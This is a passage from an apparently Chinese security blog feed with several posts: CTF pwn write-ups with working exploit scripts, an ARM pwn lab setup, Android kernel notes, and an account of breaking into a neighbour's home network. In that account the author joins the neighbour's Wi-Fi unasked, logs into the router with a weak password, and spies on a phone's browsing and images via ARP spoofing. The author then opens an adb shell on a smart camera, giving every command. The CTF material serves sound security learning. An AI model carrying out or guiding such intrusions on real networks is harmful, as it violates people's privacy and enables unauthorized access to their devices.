class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x4005b5 &lt;stop&gt;                 push   rbp</span><br><span class="line">   0x4005b6 &lt;stop+1&gt;               mov    rbp, rsp</span><br><span class="line">   0x4005b9 &lt;stop+4&gt;               mov    edi, 0x40067a</span><br><span class="line">   0x4005be &lt;stop+9&gt;               call   puts@plt &lt;0x400430&gt;</span><br><span class="line"> </span><br><span class="line">   0x4005c3 &lt;stop+14&gt;              nop    </span><br><span class="line">   0x4005c4 &lt;stop+15&gt;              pop    rbp</span><br><span class="line">   0x4005c5 &lt;stop+16&gt;              ret    </span><br><span class="line"> </span><br><span class="line">   0x4005c6                        nop    word ptr cs:[rax + rax]</span><br><span class="line">   0x4005d0 &lt;__libc_csu_init&gt;      push   r15</span><br><span class="line">   0x4005d2 &lt;__libc_csu_init+2&gt;    push   r14</span><br><span class="line">   0x4005d4 &lt;__libc_csu_init+4&gt;    mov    r15d, edi</span><br><span class="line">───────────────────────────────────────[ STACK ]───────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdc68 —▸ 0x7ffff7de7df7 (_dl_fini+823) ◂— test   r13d, r13d</span><br><span class="line">01:0008│ r14  0x7fffffffdc70 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdc78 —▸ 0x7ffff7ffe700 —▸ 0x7ffff7ffa000 ◂— jg     0x7ffff7ffa047</span><br><span class="line">03:0018│      0x7fffffffdc80 —▸ 0x7ffff7fb5000 —▸ 0x7ffff7a0d000 ◂— jg     0x7ffff7a0d047</span><br><span class="line">04:0020│ r10  0x7fffffffdc88 —▸ 0x7ffff7ffd9d8 (_rtld_global+2456) —▸ 0x7ffff7dd7000 ◂— jg     0x7ffff7dd7047</span><br><span class="line">05:0028│      0x7fffffffdc90 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde50 ◂— 0x1</span><br><span class="line">06:0030│      0x7fffffffdc98 —▸ 0x7ffff7de7b44 (_dl_fini+132) ◂— mov    ecx, dword ptr [r12]</span><br><span class="line">07:0038│      0x7fffffffdca0 —▸ 0x7fffffffdc70 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">─────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────</span><br><span class="line"> ► f 0           4005b5 stop</span><br><span class="line">   f 1     7ffff7de7df7 _dl_fini+823</span><br><span class="line">   f 2     7ffff7a46ff8 __run_exit_handlers+232</span><br><span class="line">   f 3     7ffff7a47045</span><br><span class="line">   f 4     7ffff7a2d837 __libc_start_main+247</span><br><span class="line">Breakpoint *0x4005b5</span><br><span class="line">Breakpoint *0x4005B5</span><br></pre></td></tr></table></figure><p>看到返回地址在_dl_fini+823，所以可以得出结论，.fini_array区节的第一个函数指针在程序结束时，由_dl_fini函数调用，所以我们可加以利用。在未开启PIE的情况下，只需实现一个任意地址写，将.fini_array区节的第一个函数指针改写成后门地址或者one_gadgets，在程序结束时便能控制流程</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考链接: &lt;a href=&quot;https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.l
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>记一次家庭局域网渗透经历</title>
    <link href="https://nocbtm.github.io/2020/02/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/"/>
    <id>https://nocbtm.github.io/2020/02/03/记一次家庭局域网渗透经历/</id>
    <published>2020-02-03T07:17:00.000Z</published>
    <updated>2020-02-03T07:27:11.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>寒假有些无聊,就连上隔壁家wifi玩了玩。抱着试一试的态度，却发现很多好玩的东西。</p><h2 id="登录路由器后台"><a href="#登录路由器后台" class="headerlink" title="登录路由器后台"></a>登录路由器后台</h2><p>访问 192.168.1.1 直接连上了，竟然没有做一些限制，然后直接弱口令登陆进去了。看来隔壁家安全意识不高啊。</p><p>进去后台大致浏览了一遍，发现了连接的客户端，也没有静态ARP绑定设置，这样就可以玩ARP欺骗了。<br><img alt="" data-src="https://i.loli.net/2020/02/03/9Tfg8NBGxAj3qwu.png" class="lozad"><br><img alt="" data-src="https://i.loli.net/2020/02/03/hV6Fjvm5gDWUKLk.png" class="lozad"></p><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><p>祭出尘封已久的kail,首先要把kail设为桥接模式，确保与物理机在同一网段。</p><p>然后 echo 1 &gt; /proc/sys/net/ipv4/ip_forward 进行ip转发，保证客户端的正常上网</p><p>这里用arpspoof工具来嗅探ip为192.168.1.145的荣耀V20<br>arpspoof -i eth0 -t 192.168.1.145 -r 192.168.1.1<br><img alt="" data-src="https://i.loli.net/2020/02/03/XCHM5x1VsPetFEL.png" class="lozad"><br>执行上述命令后，arpspoofing将向路由器发送伪造请求。 此请求将路由器默认IP地址链接到kali linux mac地址</p><h3 id="获得目标设备的SNIFF网站"><a href="#获得目标设备的SNIFF网站" class="headerlink" title="获得目标设备的SNIFF网站"></a>获得目标设备的SNIFF网站</h3><p>打开另一个终端并输入urlsnarf -i eth0<br>Urlsnarf显示目标正在访问的所有网站，<br>-i用于输入网络接口名称。</p><p><img alt="" data-src="https://i.loli.net/2020/02/03/7FdzsRXyMK24xUH.png" class="lozad"><br>可以看到目标正在玩QQ</p><h3 id="获得目标设备的SNIFF图像"><a href="#获得目标设备的SNIFF图像" class="headerlink" title="获得目标设备的SNIFF图像"></a>获得目标设备的SNIFF图像</h3><p>打开另一个终端并输入driftnet -i eth0<br>Driftnet显示了目标在互联网上访问的图像，如下所示。</p><p>-i用于输入网络接口名称。<br>一个新窗口将在kali linux中打开，并将嗅探目标正在访问的所有图像，嗅探到了大力的图片!<img alt="" data-src="https://i.loli.net/2020/02/03/MOaVpIRTfNLBK47.png" class="lozad"></p><p><img alt="" data-src="https://i.loli.net/2020/02/03/Sa6LcIGoWZtA2Ei.png" class="lozad"><br><img alt="" data-src="https://i.loli.net/2020/02/03/5DXVECohPbck2xe.png" class="lozad"></p><p><img alt="" data-src="https://i.loli.net/2020/02/03/8SC3NRrsXbYE94a.png" class="lozad"><br><img alt="" data-src="https://i.loli.net/2020/02/03/IqaQmXNyFBKP5kt.png" class="lozad"></p><h2 id="入侵智能摄像头"><a href="#入侵智能摄像头" class="headerlink" title="入侵智能摄像头"></a>入侵智能摄像头</h2><p>局域网内有一个未知的设备，用nmap扫了一下，发现开了554和5555端口；上网搜了一下，这两个端口都能搞事，应该是一个智能摄像头。社工了一波可能是小米家的小方摄像头。<br>554端口下的rtsp服务是实时流传输协议，是用来传输视频的<br>5555端口是用来远程调试的</p><p><img alt="" data-src="https://i.loli.net/2020/02/03/qH2nG4ZOuYRoimD.png" class="lozad"></p><h3 id="554端口"><a href="#554端口" class="headerlink" title="554端口"></a>554端口</h3><p><img alt="" data-src="https://i.loli.net/2020/02/03/gnIjwHWkEFzYv64.png" class="lozad"></p><p>需要去插SD卡，不太好还是算了吧。我还是用VCL看流媒体吧,推荐几个可以测试的流媒体</p><p><img alt="" data-src="https://i.loli.net/2020/02/03/hrfVDTJ6tvGmHnz.png" class="lozad"></p><p>湖南卫视 rtmp://58.200.131.2:1935/livetv/hunantv<br>CCTV1高清 <a href="http://ivi.bupt.edu.cn/hls/cctv1hd.m3u8" target="_blank" rel="noopener">http://ivi.bupt.edu.cn/hls/cctv1hd.m3u8</a></p><h3 id="5555端口"><a href="#5555端口" class="headerlink" title="5555端口"></a>5555端口</h3><p>用adb远程连一下，可以连上<br>./adb connect  192.168.1.102:5555<br><img alt="" data-src="https://i.loli.net/2020/02/03/zu1O4KipVsZWCNn.png" class="lozad"><br>./adb shell 开启shell，竟然直接进去了。</p><p><img alt="" data-src="https://i.loli.net/2020/02/03/ZNXdey5OIWng6YH.png" class="lozad"></p><p>查看一下开启的端口，加载的驱动<br><img alt="" data-src="https://i.loli.net/2020/02/03/rfsT8Xt3V6N59dn.png" class="lozad"></p><p>接下来就是通过驱动来内核提权了，待我再研究一番来补上续集。</p><p>参考文章：<br>使用MITM监控流量（中间人攻击）<br><a href="http://www.kb-iot.com/post/706.html" target="_blank" rel="noopener">http://www.kb-iot.com/post/706.html</a><br>Wi-Fi 安全攻略<br><a href="https://www.secpulse.com/archives/5455.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/5455.html</a><br>Android-TV-adb-5555端口攻击说明<br><a href="https://wenku.baidu.com/view/ba39d1bef021dd36a32d7375a417866fb84ac04f.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/ba39d1bef021dd36a32d7375a417866fb84ac04f.html</a><br>常见网络摄像机的端口及RTSP地址<br><a href="https://www.jiangyu.org/port-and-rtsp-address-of-several-ipcams/" target="_blank" rel="noopener">https://www.jiangyu.org/port-and-rtsp-address-of-several-ipcams/</a><br>破解小方摄像头<br><a href="https://www.jianshu.com/p/7b56d3ae72f4" target="_blank" rel="noopener">https://www.jianshu.com/p/7b56d3ae72f4</a><br>routerpwn<br><a href="http://routerpwn.com/" target="_blank" rel="noopener">http://routerpwn.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;寒假有些无聊,就连上隔壁家wifi玩了玩。抱着试一试的态度，却发现很多好玩的东西。&lt;/p&gt;
&lt;h2 id=&quot;登录路由器后台&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="web" scheme="https://nocbtm.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://nocbtm.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>arm pwn 环境搭建</title>
    <link href="https://nocbtm.github.io/2020/01/21/arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://nocbtm.github.io/2020/01/21/arm-pwn环境搭建/</id>
    <published>2020-01-21T10:05:00.000Z</published>
    <updated>2020-02-01T11:17:54.160Z</updated>
    
    <content type="html"><![CDATA[<h2 id="arm-pwn-环境搭建"><a href="#arm-pwn-环境搭建" class="headerlink" title="arm pwn 环境搭建"></a>arm pwn 环境搭建</h2><h3 id="qemu-简介"><a href="#qemu-简介" class="headerlink" title="qemu 简介"></a>qemu 简介</h3><p>qemu是一款可执行硬件虚拟化的虚拟机，与他类似的还有Bochs、PearPC，但qemu具有高速（配合KVM）、跨平台的特性<br>qemu主要有两种运行模式：qemu-user 和 qemu-system<br>安装 qemu-user<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install qemu qemu-user qemu-user-static</span><br></pre></td></tr></table></figure></p><p>此时可以运行静态链接的arm程序，而要运行动态链接的程序，需要安装对应架构的动态链接库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br></pre></td></tr></table></figure></p><p>安装 qemu-system<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qemu qemu-user-static qemu-system uml-utilities bridge-utils</span><br></pre></td></tr></table></figure></p><p>Ubuntu 16.04（deepin）<br>安装 gdb、gdb-multiarch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install gdb gdb-multiarch</span><br></pre></td></tr></table></figure></p><p>安装 gdb plugin（peda、pwndbg、gef）</p><p>peda_arm：<a href="https://github.com/alset0326/peda-arm" target="_blank" rel="noopener">https://github.com/alset0326/peda-arm</a><br>pwndbg：<a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">https://github.com/pwndbg/pwndbg</a><br>gef：<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a></p><p>配置qemu-system网络<br>qemu-system模式配置网络常见的方法是tap桥接<br>安装网络配置的依赖文件：<br>$ sudo apt install uml-utilities bridge-utils</p><p>修改Ubuntu主机网络接口配置文件：<br>$sudo vim /etc/network/interfaces</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">  bridge_ports ens33</span><br><span class="line">  bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>创建并编写qemu网络接口启动脚本：<br>$ sudo vim /etc/qemu-ifup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> \</span><br><span class="line">-net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure></p><p>保存文件后使用如下命令修改qemu-ifup的权限：<br>$ sudo chmod a+x /etc/qemu-ifup</p><p>重启网络使配置生效：<br>$ sudo /etc/init.d/networking restart    </p><p>启动桥接网络：<br>$ sudo ifdown ens33 &amp;&amp; sudo ifup br0<br>运行之后，桥br0代替ens33接管了ubuntu虚拟机的网口：</p><p>下载qemu的镜像和磁盘：<br><a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></p><p>启动 qemu<br>./start.sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">-net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure></p><p>也可以使用docker运行一个qemu arm容器,比较方便<br><a href="https://island123.github.io/2020/01/15/Docker%E8%BF%90%E8%A1%8Cqemu%20arm%E5%AE%B9%E5%99%A8%20/#%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8Cqemu-arm%E5%AE%B9%E5%99%A8" target="_blank" rel="noopener">https://island123.github.io/2020/01/15/Docker%E8%BF%90%E8%A1%8Cqemu%20arm%E5%AE%B9%E5%99%A8%20/#%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8Cqemu-arm%E5%AE%B9%E5%99%A8</a></p><p><a href="https://github.com/fireundubh/IDA7-Rizzo" target="_blank" rel="noopener">https://github.com/fireundubh/IDA7-Rizzo</a> ida7.0，把rizzo.py放到ida插件文件夹里</p><p>参考文章：<a href="http://myhackerworld.top/2018/09/27/arm-pwn/" target="_blank" rel="noopener">http://myhackerworld.top/2018/09/27/arm-pwn/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;arm-pwn-环境搭建&quot;&gt;&lt;a href=&quot;#arm-pwn-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;arm pwn 环境搭建&quot;&gt;&lt;/a&gt;arm pwn 环境搭建&lt;/h2&gt;&lt;h3 id=&quot;qemu-简介&quot;&gt;&lt;a href=&quot;#qemu-简
      
    
    </summary>
    
      <category term="arm-pwn" scheme="https://nocbtm.github.io/categories/arm-pwn/"/>
    
    
      <category term="arm-pwn" scheme="https://nocbtm.github.io/tags/arm-pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019 xman writeup</title>
    <link href="https://nocbtm.github.io/2020/01/20/2019-xman-writeup/"/>
    <id>https://nocbtm.github.io/2020/01/20/2019-xman-writeup/</id>
    <published>2020-01-20T08:05:00.000Z</published>
    <updated>2020-02-02T02:25:04.073Z</updated>
    
    <content type="html"><![CDATA[<h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难点在于是堆上的格式化字符串漏洞，不能用常规的任意地址写手法</p><p><img alt="1580540236536.png" data-src="https://i.loli.net/2020/02/02/m8HcfNuhn37EIJL.png" class="lozad"></p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>寻找如下图合适的跳板，第一次修改跳板为函数返回地址所在的栈地址，第二次修改函数返回地址为后门的地址。</p><p><img alt="1580541684651.png" data-src="https://i.loli.net/2020/02/02/eXNLWR6oSnIOHsy.png" class="lozad"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>成功几率16分之一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level=<span class="string">'debug'</span> </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">5000</span>): </span><br><span class="line"><span class="comment">#with remote("node3.buuoj.cn",26370) as p: </span></span><br><span class="line"><span class="keyword">with</span> process(<span class="string">"./chall"</span>) <span class="keyword">as</span> p: </span><br><span class="line">p.recvuntil(<span class="string">"...\n"</span>) </span><br><span class="line">p.recvuntil(<span class="string">"...\n"</span>) </span><br><span class="line">gdb.attach(p,<span class="string">"b *0x080485F6"</span>)</span><br><span class="line">p.sendline(<span class="string">"%60c%10$hhn|%34219c%18$hnBBB"</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recvuntil(<span class="string">"BBB"</span>) </span><br><span class="line"><span class="comment">#p.interactive() </span></span><br><span class="line">p.sendline(<span class="string">"ls"</span>) </span><br><span class="line">data = p.recvuntil(<span class="string">"flag"</span>) </span><br><span class="line">print(data) </span><br><span class="line"><span class="keyword">if</span>(<span class="string">"flag"</span> <span class="keyword">in</span> data): </span><br><span class="line">p.interactive() </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">print(<span class="string">'exception %s'</span> % e) </span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="nocall"><a href="#nocall" class="headerlink" title="nocall"></a>nocall</h2><p>64位程序，保护全开。题目提示输入shellcode,但这个题使用了seccomp机制，限制了execve系统调用。</p><p><img alt="1580542882966.png" data-src="https://i.loli.net/2020/02/02/sjCx4yRJo9XLfOd.png" class="lozad"><br><img alt="1580542965768.png" data-src="https://i.loli.net/2020/02/02/LIocbYu7xVNarG6.png" class="lozad"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>因为flag的地址已经暴露了，程序也开启了5秒的计时器，可以通过基于时间的方法爆破flag。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">s = <span class="string">'&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2000000000</span>,<span class="number">0x200000000</span>+<span class="number">0x30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        payload=asm(</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            mov al,[&#123;&#125;]</span></span><br><span class="line"><span class="string">            mov bl,&#123;&#125;</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">            cmp al,bl</span></span><br><span class="line"><span class="string">            jz loop</span></span><br><span class="line"><span class="string">            ret</span></span><br><span class="line"><span class="string">            """</span>.format(str(hex(i)),str(hex(ord(j)))))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#p = remote("node3.buuoj.cn",29793)</span></span><br><span class="line">            p = process(<span class="string">"./chall"</span>)</span><br><span class="line">            p.recvuntil(<span class="string">"Your Shellcode &gt;&gt;"</span>)</span><br><span class="line">            time1=time()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> str(hex(i))+<span class="string">"-----"</span>+j</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.can_recv(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            time2=time()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="comment">#pause()</span></span><br><span class="line">            <span class="keyword">if</span> time2-time1&gt;<span class="number">1</span>:</span><br><span class="line">                flag+=j</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="shellmaster"><a href="#shellmaster" class="headerlink" title="shellmaster"></a>shellmaster</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="variable">$&#123;PATH##*:&#125;</span>;B=<span class="variable">$&#123;A%???&#125;</span>;<span class="variable">$PWD</span><span class="variable">$B</span>????</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;format&quot;&gt;&lt;a href=&quot;#format&quot; class=&quot;headerlink&quot; title=&quot;format&quot;&gt;&lt;/a&gt;format&lt;/h2&gt;&lt;p&gt;32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Android kernel 入门</title>
    <link href="https://nocbtm.github.io/2020/01/12/Android%20kernel%20%E5%85%A5%E9%97%A8/"/>
    <id>https://nocbtm.github.io/2020/01/12/Android kernel 入门/</id>
    <published>2020-01-12T12:02:02.000Z</published>
    <updated>2020-02-02T02:30:03.072Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Android-系统架构"><a href="#Android-系统架构" class="headerlink" title="Android 系统架构"></a>Android 系统架构</h3><p>Android系统构架是安卓系统的体系结构，android的系统架构和其操作系统一样，采用了分层的架构，一般共分为四层，从高到低分别是：</p><ul><li>Android应用层 - 包括通话短信联系人这种系统级的应用，还包括用户自己安装的第三方应用</li><li>Android应用框架层 - 这一层大部分用Java写的，包括系统服务和四大组件</li><li>Android系统运行层  - 这一层大部分都是C/C++写的，主要是虚拟机 Dalvik/ART ，还有一些第三方库</li><li>Linux内核层 - 包含Linux内核和一些驱动，比如说蓝牙驱动，Camera驱动等等</li></ul><p>还有 HAL层-硬件抽象层</p><p>Android系统构架主要应用于ARM平台，但不仅限于ARM，通过编译控制，在X86、MAC等体系结构的机器上同样可以运行。<br><img alt="1579162747715.png" data-src="https://i.loli.net/2020/02/02/ZTSr8WpEQKBcz2o.png" class="lozad"></p><h3 id="Android进程间通信-binder"><a href="#Android进程间通信-binder" class="headerlink" title="Android进程间通信-binder"></a>Android进程间通信-binder</h3><ul><li>IPC(Inter-Process Communication)进程间通讯 </li><li>C（低权限应用）/S（高权限系统服务）</li><li>/dev/binder – framework和app之间IPC通信桥梁</li><li>/dev/hwbinder（8.0之后） – framework和vendor之间的IPC通信桥梁 </li><li>/dev/vndbinder（8.0之后） – vendor和vendor之间的IPC通信桥梁</li></ul><h3 id="SELinux限制"><a href="#SELinux限制" class="headerlink" title="SELinux限制"></a>SELinux限制</h3><p>Android 8.0之后推出厂商升级成本大大降低，8.0之后增加vendor.img镜像 ，攻击面大大减少， 很多厂商的代码不与应用层直接交互， 增加了应用和厂商代码的SELinux限制</p><h3 id="Android-内核攻击面"><a href="#Android-内核攻击面" class="headerlink" title="Android 内核攻击面"></a>Android 内核攻击面</h3><ul><li>应用直达内核路径寥寥无几 – /dev/binder、/dev/ashmem等</li><li>厂商自定义的驱动设备 – cat /proc/devices</li><li>应用 -&gt; system_server等 -&gt; 内核 </li><li>应用 -&gt; 系统应用 -&gt; system_server等 -&gt; 内核</li></ul><h3 id="Android内核缓释机制"><a href="#Android内核缓释机制" class="headerlink" title="Android内核缓释机制"></a>Android内核缓释机制</h3><ul><li>DAC/ CAP Linux最基本的安全缓释机制</li><li>PXN（Privileged Execute Never）类似于x86中的SMEP,防止内核态执行用户态代码,防御RET2USR攻击,可以通过修改rc4 来绕过。Android 5 arm64后开启，Android通过页表来开启PXN。<br><img alt="1579165663629.png" data-src="https://i.loli.net/2020/02/02/s5ISEpBU8m9Ng7u.png" class="lozad"></li><li>PAN (Privileged Access Never) 类似于x86中的SMAP ,防止内核任意读取用户态数据，Android 8.0之后加入。<br><img alt="1579166009547.png" data-src="https://i.loli.net/2020/02/02/tpbJR7ugO5scLB4.png" class="lozad"></li><li>SECCOMP 